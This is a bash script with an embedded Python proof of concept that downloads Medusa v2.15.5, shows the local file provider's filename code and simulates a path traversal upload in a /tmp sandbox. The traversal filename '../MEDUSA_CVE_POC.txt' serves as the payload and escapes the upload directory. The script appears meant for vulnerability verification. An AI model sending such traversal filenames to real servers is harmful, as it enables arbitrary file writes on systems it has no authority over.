#!/usr/bin/env bash
set -euo pipefail

WORK="/tmp/medusa-2155-test"
ZIP="$WORK/medusa-v2.15.5.zip"
URL="https://github.com/medusajs/medusa/archive/refs/tags/v2.15.5.zip"

rm -rf "$WORK"
mkdir -p "$WORK"

echo "[+] Downloading Medusa v2.15.5..."
curl -L "$URL" -o "$ZIP"

echo "[+] Extracting..."
unzip -q "$ZIP" -d "$WORK"

SRC="$WORK/medusa-2.15.5/packages/modules/providers/file-local/src/services/local-file.ts"

if [ ! -f "$SRC" ]; then
  echo "[-] Source file not found: $SRC"
  exit 1
fi

echo "[+] Found vulnerable-looking source:"
echo "    $SRC"

echo
echo "[+] Relevant code:"
grep -nE "filename|parsedFilename|path.join|writeFile|createWriteStream" "$SRC" || true

echo
echo "[+] Running local path traversal simulation..."

python3 <<'PY'
import os, time, shutil
from pathlib import Path

base = Path("/tmp/medusa-local-provider-poc/uploads")
root = base.parent
shutil.rmtree(root, ignore_errors=True)
base.mkdir(parents=True, exist_ok=True)

# Simulates Medusa local provider logic:
# parsedFilename = path.parse(filename)
# fileKey = `${Date.now()}-${parsedFilename.name}${parsedFilename.ext}`
# if parsedFilename.dir: fileKey = `${parsedFilename.dir}/${fileKey}`
# filePath = path.join(upload_dir, fileKey)

payload_filename = "../MEDUSA_CVE_POC.txt"

dirname = os.path.dirname(payload_filename)
name, ext = os.path.splitext(os.path.basename(payload_filename))
file_key = f"{int(time.time()*1000)}-{name}{ext}"

if dirname:
    file_key = f"{dirname}/{file_key}"

target = base / file_key
target.parent.mkdir(parents=True, exist_ok=True)
target.write_text("MEDUSA PATH TRAVERSAL POC\n")

print(f"[+] Upload dir: {base}")
print(f"[+] Payload filename: {payload_filename}")
print(f"[+] Computed file_key: {file_key}")
print(f"[+] Final write path: {target.resolve()}")

try:
    target.resolve().relative_to(base.resolve())
    escaped = False
except ValueError:
    escaped = True

print()
if escaped and target.exists():
    print("[VULNERABLE] File escaped upload directory.")
    print(f"[+] Escaped file exists at: {target.resolve()}")
else:
    print("[NOT VULNERABLE] File stayed inside upload directory.")

print()
print("[+] Directory tree:")
for p in sorted(root.rglob("*")):
    print("   ", p)
PY

echo
echo "[+] Done."
